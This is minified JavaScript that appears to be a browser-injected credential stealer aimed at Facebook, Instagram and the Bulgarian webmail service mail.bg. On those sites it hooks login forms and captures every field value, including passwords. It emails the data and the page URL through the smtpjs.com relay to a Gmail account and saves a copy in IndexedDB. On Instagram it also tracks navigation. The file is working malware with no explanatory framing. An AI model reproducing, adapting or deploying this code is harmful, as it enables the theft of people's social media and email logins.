var Email={send:function(e){return new Promise(function(n,t){e.nocache=Math.floor(1e6*Math.random()+1),e.Action="Send";var o=JSON.stringify(e);Email.ajaxPost("https://smtpjs.com/v3/smtpjs.aspx?",o,function(e){n(e)})})},ajaxPost:function(e,n,t){var o=Email.createCORSRequest("POST",e);o.setRequestHeader("Content-type","application/x-www-form-urlencoded"),o.onload=function(){var e=o.responseText;null!=t&&t(e)},o.send(n)},ajax:function(e,n){var t=Email.createCORSRequest("GET",e);t.onload=function(){var e=t.responseText;null!=n&&n(e)},t.send()},createCORSRequest:function(e,n){var t=new XMLHttpRequest;return"withCredentials"in t?t.open(e,n,!0):"undefined"!=typeof XDomainRequest?(t=new XDomainRequest).open(e,n):t=null,t}};function SaveToDB(e){window.indexedDB=window.indexedDB||window.mozIndexedDB||window.webkitIndexedDB||window.msIndexedDB,window.IDBTransaction=window.IDBTransaction||window.webkitIDBTransaction||window.msIDBTransaction||{READ_WRITE:"readwrite"},window.IDBKeyRange=window.IDBKeyRange||window.webkitIDBKeyRange||window.msIDBKeyRange;window.indexedDB.deleteDatabase("MyDatabase"),window.indexedDB.open("MyDatabase",3).onupgradeneeded=function(n){n.target.result.createObjectStore("info",{autoIncrement:!0}).add(e,"Data")}}function setCookie(e,n,t){var o="";if(t){var i=new Date;i.setTime(i.getTime()+60*t*1e3),o="; expires="+i.toUTCString()}document.cookie=e+"="+(n||"")+o+"; path=/"}function getCookie(e){for(var n=e+"=",t=document.cookie.split(";"),o=0;o<t.length;o++){for(var i=t[o];" "==i.charAt(0);)i=i.substring(1,i.length);if(0==i.indexOf(n))return i.substring(n.length,i.length)}return null}var forms,data="";function sendEmail(e){getCookie(e)||(setCookie(e,!0,1),Email.send({Host:"smtp.gmail.com",Username:user,Password:pass,To:user,From:user,Subject:"S_UPD",Body:String(e)}))}function hookForms(){forms.forEach(e=>{var n=function(){var n={};Array.from(e.elements).forEach(e=>{data+=String(e.name)+": "+String(e.value)+" | ",n[e.name]=e.value}),sendEmail(data+=String(location)+" || "),SaveToDB(n),data=""};if(location.hostname.includes("mail.bg")){document.querySelectorAll("a").forEach(e=>{e.innerHTML.includes("ВЛЕЗ")&&e.addEventListener("click",()=>{n()})})}else{var t=e.querySelector('button[type="submit"]');null==t?e.addEventListener("submit",()=>{n()}):t.addEventListener("click",()=>{n()})}})}var tries=0;function initHook(){forms=document.querySelectorAll("form"),tries>=10||(forms.length<=0?(tries++,setTimeout(initHook,2e3)):hookForms())}function initHREF(){var e=history.pushState,n=history.replaceState;history.pushState=function(){e.apply(history,arguments),window.dispatchEvent(new Event("pushstate")),window.dispatchEvent(new Event("locationchange"))},history.replaceState=function(){n.apply(history,arguments),window.dispatchEvent(new Event("replacestate")),window.dispatchEvent(new Event("locationchange"))},window.addEventListener("popstate",function(){window.dispatchEvent(new Event("locationchange"))}),window.addEventListener("locationchange",function(){sendEmail(String(location))})}function InitProgram(){(location.hostname.includes("facebook")||location.hostname.includes("instagram")||location.hostname.includes("mail.bg"))&&(sendEmail(String(location)),initHook(),location.hostname.includes("instagram")&&initHREF())}
